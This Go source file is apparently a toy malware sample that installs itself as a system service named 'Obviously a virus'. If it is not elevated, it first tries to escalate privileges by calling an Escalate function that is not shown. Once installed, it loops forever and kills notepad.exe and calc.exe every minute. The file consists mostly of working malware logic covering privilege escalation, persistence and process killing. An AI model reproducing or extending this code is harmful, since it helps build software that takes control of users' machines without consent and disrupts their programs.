package main

import (
	"os"
	"reflect"
	"strings"
	"time"

	"github.com/takama/daemon"
)

func killProcess(pid int) {
	if proc, err := os.FindProcess(pid); err == nil {
		proc.Kill()
	}
}

func ExistsInSlice(slice interface{}, item interface{}) bool {
	s := reflect.ValueOf(slice)

	if s.Kind() != reflect.Slice {
		panic("SliceExists() given a non-slice type")
	}

	for i := 0; i < s.Len(); i++ {
		if s.Index(i).Interface() == item {
			return true
		}
	}

	return false
}

var (
	marked_file_to_kill = []string{
		"notepad.exe",
		"calc.exe",
	}
)

func main() {
	if executablePath, err := os.Executable(); err == nil {
		if CheckElevate() == false {
			if err := Escalate(executablePath); err != nil {
				return
			}
		} else {
			if service, err := daemon.New("Obviously a virus", "A sample description to see", daemon.SystemDaemon); err == nil {
				if _, err := service.Install(); err == nil {
					// yeah we are working man

					for {
						var to_kill_processes []int

						if running_process, err := processes(); err == nil {
							for _, process := range running_process {
								if ExistsInSlice(marked_file_to_kill, strings.ToLower(process.Executable())) {
									to_kill_processes = append(to_kill_processes, process.Pid())
								}
							}

							for _, pid := range to_kill_processes {
								killProcess(pid)
							}
						}

						time.Sleep(time.Minute * 1)
					}

				}
			}
		}
	}
}
